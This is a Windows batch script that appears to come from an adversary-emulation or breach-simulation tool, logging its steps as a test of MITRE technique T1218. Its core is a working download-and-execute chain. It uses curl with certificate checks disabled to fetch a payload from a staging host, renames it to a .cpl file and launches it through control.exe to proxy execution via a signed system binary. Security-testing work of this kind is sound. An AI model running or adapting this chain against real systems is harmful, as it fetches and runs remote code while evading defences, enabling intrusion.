@echo off
setlocal enabledelayedexpansion

SET gfrtyu=%APPDATA%\10506\fab353c5
SET bnmqaz=29d159f6.txt
SET lkjiop=https://10.0.0.49/stage/2/icon.png?10506-7
SET qwsxcd=BALAM-S2B
SET vfrtgb=10506
SET nhyujm=7
SET mjuytb=%APPDATA%\!nhyujm!\macula-simulations.log
SET zbxcvn=!DATE!/!TIME!

mkdir "%APPDATA%\!nhyujm!" 2>nul
echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: heartbeat_start>> "!mjuytb!" 2>nul
curl -k -s -o "!gfrtyu!\!bnmqaz!" "!lkjiop!"
if exist "!gfrtyu!\!bnmqaz!" (
    echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: heartbeat_complete>> "!mjuytb!" 2>nul
) else (
    echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: heartbeat_complete>> "!mjuytb!" 2>nul
)

echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: chdir_start>> "!mjuytb!" 2>nul
cd /d "!gfrtyu!" >nul 2>&1
if errorlevel 1 (set chdir_status=1) else (set chdir_status=0)
echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: chdir_result=!chdir_status!>> "!mjuytb!" 2>nul

echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: rename_start>> "!mjuytb!" 2>nul
ren "!bnmqaz!" "!bnmqaz!.cpl" 2>nul
if exist "!bnmqaz!.cpl" (set rename_ok=1) else (set rename_ok=0)
echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: rename_result=!rename_ok!>> "!mjuytb!" 2>nul

echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: control_start>> "!mjuytb!" 2>nul
start "" /wait control.exe "!bnmqaz!.cpl" >nul 2>&1
if errorlevel 1 (set lolbin_result=FAIL) else (set lolbin_result=OK)
echo [!zbxcvn!][DEBUG][!qwsxcd!][!vfrtgb!]: control_result=!lolbin_result!>> "!mjuytb!" 2>nul

for /f "tokens=2 delims==." %%a in ('wmic os get localdatetime /value ^| findstr [0-9]') do set datetime=%%a
set ttp_timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!

if "!lolbin_result!"=="OK" (
    echo [!ttp_timestamp!][TTP][!qwsxcd!][!vfrtgb!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!mjuytb!"
) else (
    echo [!ttp_timestamp!][TTP][!qwsxcd!][!vfrtgb!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!mjuytb!"
)

endlocal